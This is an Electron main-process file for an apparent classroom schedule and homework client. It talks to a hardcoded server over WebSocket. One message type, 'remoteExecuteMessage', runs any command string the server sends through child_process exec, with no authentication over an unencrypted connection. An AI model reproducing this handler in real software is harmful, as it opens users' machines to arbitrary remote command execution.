import path from 'path'
import fs from 'fs'
import http from 'http'
import { app, ipcMain } from 'electron'
import serve from 'electron-serve'
import { createWindow } from './helpers'

const isProd = process.env.NODE_ENV === 'production'

if (isProd) {
  serve({ directory: 'app' })
} else {
  app.setPath('userData', `${app.getPath('userData')} (development)`)
}

async function LoadPage(window,pageRute:string) {
  if (isProd) {
    await window.loadURL('app://.'+pageRute+'/page')
  } else {
    const port = process.argv[2]
    await window.loadURL(`http://localhost:${port}`+pageRute+'/page')
  }
}

function downloadFileByHashValue(filehash){
  const fs = require('fs');
  const http = require('http');
  const fileUrl = 'http://106.53.58.190/'+filehash;
  const targetPath = 'downloads';
  http.get(fileUrl, (response) => {
  
  const fileStream = fs.createWriteStream(targetPath);
  response.pipe(fileStream);
  fileStream.on('finish', () => {
    console.log('文件下载成功');
    fileStream.close();
  });
}).on('error', (err) => {
  console.error('文件下载错误', err.message);
});

}

const { BrowserWindow} = require('electron');
const Store = require('electron-store');
const { exec } = require('child_process');
const WebSocket = require('ws');
let store = new Store()
app.commandLine.appendSwitch('wm-window-animations-disabled');
let loginWindow;
let loadWindow;
let dialogWindow;
let mainWindow;
let scheduleWindow;
let homeworkWindow;

let homeworkWindowClosed = false;

let ws;
let isLogined = false;
let nextJSData;
let reconnectInterval;

let globalMessageObj
let globalMessageList
let lastDialogMessage

let userId
let userName

const _classStorageByDay = 'classOnDay'
const _messageStorageList = 'messageList'
const _homeWorkStorageByDay = 'homeworkOnDay'
const _tasksStorage = 'tasksEachDay'

let tasks = store.get(_tasksStorage);
tasks = tasks?tasks:[
  // { cmd: "任务1", time: Date.now() + 5000 }
];

function compareTimes(time1, time2) {
  const [hours1, minutes1] = time1.split(':').map(Number);
  const [hours2, minutes2] = time2.split(':').map(Number);

  const totalMinutes1 = hours1 * 60 + minutes1;
  const totalMinutes2 = hours2 * 60 + minutes2;

  if (totalMinutes1 < totalMinutes2) {
    return -1;
  } else if (totalMinutes1 > totalMinutes2) {
    return 1;
  } else {
    return 0; // 时间相等
  }
}


function startWebSocketConnection() {
  ws = new WebSocket('ws://106.53.58.190:8900/ws');

  ws.onopen = () => {
    console.log('WebSocket connection opened');
    clearInterval(reconnectInterval);
    if(isLogined == false){
      if (userId) {
        loadWindow = new BrowserWindow({
          frame: false,
          width: 350,
          height: 200,
          alwaysOnTop: false,
          transparent: true,
          autoHideMenuBar:true,
          webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js'),
          },
        })
        LoadPage(loadWindow,'/LinearIndeterminate')
        loadWindow.once('ready-to-show',()=>{
          loadWindow.show();
        })
        loadWindow.on('closed', () => {
          loadWindow = null;
        });
        setTimeout(()=>{
          sendObj(store.get('loginDataPack'))
    
        },3000)
    
      }else{
        loginWindow = new BrowserWindow({
          transparent:true,
          frame:false,
          width: 420,
          height: 490,
          autoHideMenuBar:true,
          webPreferences: {
            nodeIntegration: false,
            contextIsolation: true,
            preload: path.join(__dirname, 'preload.js'),
          },
        });
    
        LoadPage(loginWindow,'/windows/login')
        console.log('登录窗口已加载')
        loginWindow.once('ready-to-show',()=>{
          loginWindow.show();
        })
    
        loginWindow.on('closed', () => {
          loginWindow = null;
          if (isLogined === false) {
            app.quit();
          }
        });
    
      }
    }
    
  };

  ws.onmessage = (evt) => {

    let message = JSON.parse(evt.data)
    globalMessageObj = message;
    console.log('NEXTJSmessage:',nextJSData)
    console.log('Received message from server:', message);
    switch (message.command) {
      case "login":
        if (message.status === 'success'){
          loginWindow? loginWindow.close() :null;
          loadWindow? loadWindow.close():null;
          isLogined = true
          store.set('userName',message.content.userName);
          store.set('userId',message.content.userId)
          userId = message.content.userId;
          userName = message.content.userName;
          mainWindow = new BrowserWindow({
            frame: false,
            width: 800,
            height: 600,
            alwaysOnTop: false,
            autoHideMenuBar:true,
            transparent: true,
            webPreferences: {
              nodeIntegration: false,
              contextIsolation: true,
              preload: path.join(__dirname, 'preload.js'),
            },
          })
          LoadPage(mainWindow,'/windows/main')
          mainWindow.once('ready-to-show',()=>{
            mainWindow.show();
          })
          mainWindow.on('closed', () => {
            mainWindow = null;
          });
          let x = store.get('schedule_x');
          let y = store.get('schedule_y');
          let width =  store.get('schedule_width');
          let height =  store.get('schedule_height');
          scheduleWindow = new BrowserWindow({
            frame:false,
            width: width?width:170,
            height: height?height:660,
            x: x?x:1400,
            y: y?y:80,
            alwaysOnTop:true,
            webPreferences: {
              nodeIntegration: false,
              contextIsolation: true,
              preload: path.join(__dirname, 'preload.js'),
            },
          });
          scheduleWindow.setSkipTaskbar(true)
          LoadPage(scheduleWindow,'/schedule')
          scheduleWindow.once('ready-to-show',()=>{
            scheduleWindow.show();
          })




          const intervalInMilliseconds = 5000; // 2秒钟

          setInterval(() => {
            const currentTime = Date.now();
        if(scheduleWindow){
            let position = scheduleWindow.getPosition();
            store.set('schedule_x',position[0])
            store.set('schedule_y',position[1])
            let winset = scheduleWindow.getSize();
            store.set('schedule_width',winset[0]);
            store.set('schedule_height',winset[1]);
        }

            // 遍历任务数组
            tasks.forEach(task => {
              let classes = store.get(_classStorageByDay+String(new Date().getDay()));
              classes = classes?classes:[{turn:1 , time: '08:00', subject: '语文' },
                {turn:2, time: '09:00', subject: '数学' },
                {turn:3, time: '10:00', subject: '英语' },
                {turn:4, time: '11:00', subject: '物理' },
                {turn:5, time: '12:00', subject: '化学' },
                {turn:6, time: '13:00', subject: '政治' },
                {turn:7, time: '14:00', subject: '历史' },
                {turn:8, time: '15:00', subject: '地理' },
                {turn:9, time: '16:00', subject: '生物' },];
              let maxTurn = 0;
              let date = new Date();
              const hours = date.getHours().toString().padStart(2, '0');
              const minutes = date.getMinutes().toString().padStart(2, '0');
              classes.forEach((aclass)=>{
                if(compareTimes(aclass.time,`${hours}:${minutes}`)<0){
                  if (maxTurn<=aclass.turn){
                    maxTurn = aclass.turn;
                  }
                }
              })
              scheduleWindow.webContents.send('updateCurrentClass',maxTurn-1)
              if ((homeworkWindow == null) && classes[maxTurn-1]?.subject === '自习' && homeworkWindowClosed === false){
                homeworkWindow = new BrowserWindow({
                  fullscreen:true,
                  autoHideMenuBar:true,
                  webPreferences: {
                    nodeIntegration: false,
                    contextIsolation: true,
                    preload: path.join(__dirname, 'preload.js'),
                  },
                })
                LoadPage(homeworkWindow,'/homework')
                homeworkWindow.once('ready-to-show',()=>{
                  homeworkWindow.show();
                })
                homeworkWindow.on('closed', () => {
                  homeworkWindow = null;
                });
              }
              if(!(classes[maxTurn-1]?.subject == '自习')){
                homeworkWindow?homeworkWindow.close():null;
              }

              // 检查当前时间是否在任务时间允许的误差范围内
              if (Math.abs(task.time - currentTime) <= 10000) {
                // 执行任务

                console.log(`${task.cmd} 在 ${new Date(task.time)} 执行`);
              }
            });
          }, intervalInMilliseconds);
        }else{
          if (message.message === '用户不存在'){
          nextJSData.command = 'register'
          sendObj(nextJSData)//自动注册
          }else{
            loginWindow?AlertToWindow(loginWindow,'登录失败'):null;
          }
        }
        break;
      case 'register':
        if (message.status === 'success'){
          let loginDataPack = {
            command:'login',
            content:{
              userId:message.content.userId,
              userName:message.content.userName,
              userPassword:nextJSData.content.userPassword,
              deviceType:1
            }
          }
          store.set('loginDataPack',loginDataPack)
          sendObj(loginDataPack)//自动登录
        }else{
          loginWindow?AlertToWindow(loginWindow,'注册失败'):null;
        }
        break
      case 'sendMessage':
        let content = message.content;
        switch (content.type){
          case 'ordinaryMessage':
            let msgObj = content.data;
              globalMessageList.push(msgObj)
              store.set(_messageStorageList,JSON.stringify(globalMessageList));
              mainWindow?mainWindow.webContents.send('onMessage', msgObj):null;
              
            break
          case 'alertMessage':
            lastDialogMessage = content;
            dialogWindow = new BrowserWindow({
              frame: false,
              width: 590,
              height: 500,
              alwaysOnTop: false,
              transparent: true,
              autoHideMenuBar:true,
              webPreferences: {
                nodeIntegration: false,
                contextIsolation: true,
                preload: path.join(__dirname, 'preload.js'),
              },
            })
            LoadPage(dialogWindow,'/windows/Dialog')
            dialogWindow.once('ready-to-show',()=>{
              dialogWindow.show();
            })
            dialogWindow.on('closed', () => {
              dialogWindow = null;
            });
            break
          case 'classUpdateMessage':
            scheduleWindow?scheduleWindow.webContents.send('updateClasses', content.data):null;
            if (content.data){
              store.set(_classStorageByDay+content.data.day,content.data.classList)
            }
            break
          case 'remoteExecuteMessage':
            let cmd = content.data.cmd;
            exec(cmd, (error, stdout, stderr) => {
              if (error) {
                console.error(`执行命令时发生错误: ${error}`);
                return;
              }
              console.log(`命令执行成功，输出: ${stdout}`);
            });

            break//可以换成remote excute
          case 'fileMessage':
            
            break
          case 'timerTaskMessage':
            tasks.push(content.data);
            store.set(_tasksStorage,tasks);
            break
          case 'homeworkMessage':
            let date = new Date().getDay();
            let homework = content.data;
              let homeworks = store.get(_homeWorkStorageByDay+date);
              homeworks = homeworks?[...homeworks,homework]:[homework];
              store.set(_homeWorkStorageByDay+date,homeworks);
              homeworkWindow?homeworkWindow.webContents.send('uploadHomework',homework):null;
        }
        break;
    }
  };

  ws.onclose = (event) => {
    console.error(`WebSocket connection closed with code ${event.code}. Reconnecting...`);
    reconnectInterval = setInterval(() => {
      startWebSocketConnection();
    }, 3000);
  };
}

function AlertToWindow(Window, msg){
  // let msgObj = {
  //   type:type,
  //   message:message,
  // }
  Window.webContents.send('alert', msg);
}

function sendObj(Obj){
  ws.send(JSON.stringify(Obj))
  console.log("sending message:",Obj);
}

app.whenReady().then(() => {
  globalMessageList = store.get(_messageStorageList)?JSON.parse(store.get(_messageStorageList)):[];
  //init
  startWebSocketConnection();
  userId = store.get('userId');
  userName = store.get('userName');
  // IPC Area
  ipcMain.handle('getLastMessage', (event, args)=>{
    return globalMessageObj;
  })
  ipcMain.handle('getUserData', (event, args)=>{
    return {
      userId:userId,
      userName:userName
    };
  })
  ipcMain.handle('getHomeworkData',()=>{
    let homeworks = store.get(_homeWorkStorageByDay+new Date().getDay())
    return homeworks?homeworks:[];
  })

  ipcMain.handle('getMessages', (event, args)=>{
    return globalMessageList;

    // [
    //   {
    //     id: 1,
    //     title: '关于明天的考试安排',
    //     sender: '张老师',
    //     content: '大家注意准备，明天上午8点开始考试，请提前到达考场。',
    //     attachments: [
    //       {
    //         filename: '考试通知.pdf',
    //         url: 'https://example.com/exam_notice.pdf',
    //       },
    //       {
    //         filename: '考试时间表.xlsx',
    //         url: 'https://example.com/exam_schedule.xlsx',
    //       },
    //     ],
    //   },
    //   {
    //     id: 2,
    //     title: '下周的活动通知',
    //     sender: '王老师',
    //     content: '下周五下午2点将举行班级活动，请大家准时参加。',
    //     attachments: [
    //       {
    //         filename: '活动详情.docx',
    //         url: 'https://example.com/activity_details.docx',
    //       },
    //     ],
    //   },
    //   // 其他消息...
    // ]
  })
  ipcMain.handle('getClassesByDay', (event)=>{
    let classes = store.get(_classStorageByDay+String(new Date().getDay()));
    return classes?classes:[];
  })
  ipcMain.handle('getTasks', (event)=>{
    let tasks = store.get(_tasksStorage);
    return tasks?tasks:[];
  })

  ipcMain.handle('getStorage', (event,name)=>{
    let storage = store.get(name);
    return storage?storage:null;
  })

  ipcMain.handle('setStorage', (event,name,arg)=>{
    store.set(name,arg);
    return true;
  })
  
  ipcMain.on('closeHomeworkWindow',()=>{
    homeworkWindowClosed = true;
    homeworkWindow.close();
  })

  ipcMain.on('download-file', (event, url, path) => {
    const file = fs.createWriteStream(path);
    const request = http.get(url, (response) => {
      const totalBytes = response.headers['content-length'];
  
      response.pipe(file);
  
      response.on('data', (chunk) => {
        const downloadedBytes = file.bytesWritten;
        const progress = (downloadedBytes / Number(totalBytes)) * 100;
  
        event.sender.send('download-progress', progress, url);
      });
  
      file.on('finish', () => {
        file.close();
        event.sender.send('download-complete' ,url);
      });
    });
  
    request.on('error', (error) => {
      fs.unlink(path,null);
      event.sender.send('download-error', error.message , url);
    });
  });

  ipcMain.on('nextjs-message', (event, data) => {
    console.log("recved msg from NEXT.JS:",data);
    if (ws.readyState === WebSocket.OPEN) {
      nextJSData = data;
      sendObj(nextJSData);
    } else {
      console.error('WebSocket connection is not open');
    }
  });
  ipcMain.on('minimize-window', () => {
    const selectedWindow = BrowserWindow.getFocusedWindow();
    if (selectedWindow) {
      selectedWindow.minimize();
    }
  });

  ipcMain.on('close-window', () => {
    const selectedWindow = BrowserWindow.getFocusedWindow();
    if (selectedWindow) {
      selectedWindow.close();
    }
  });


    // 隐藏窗口的任务栏图标


});

app.on('window-all-closed', () => {
  if (isLogined === false) {
    app.quit();
  }
});

app.on('activate', () => {
  if (loginWindow === null) {
    if (isLogined === false) {
      app.quit();
    }
  }
});